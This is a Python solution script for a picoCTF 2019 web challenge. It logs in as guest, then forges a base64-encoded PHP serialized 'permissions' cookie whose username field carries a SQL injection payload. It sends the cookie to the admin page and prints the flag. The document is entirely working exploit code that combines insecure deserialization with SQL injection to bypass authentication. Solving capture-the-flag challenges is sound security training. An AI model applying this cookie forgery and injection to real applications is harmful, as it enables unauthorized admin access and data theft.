from requests import *
import base64

s = Session()
url = 'https://2019shell1.picoctf.com/problem/37889/index.php?file=login'
data = {
    'user' : 'guest',
    'pass' : 'guest'
}

r = post(url , data=data)
url = 'https://2019shell1.picoctf.com/problem/37889/index.php?file=admin'
payload = "O:11:\"permissions\":2:{s:8:\"username\";s:16:\"admin' and 1=1 #\";s:8:\"password\";s:1:\"1\";}"
payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
cookies = {
    'user_info' : payload
}

r = get(url , cookies=cookies)
pos = r.text.find('Flag:')
pos += 6
while(True):
    print(r.text[pos] , end='')
    if (r.text[pos] == '}'):
        print()
        break
    pos += 1
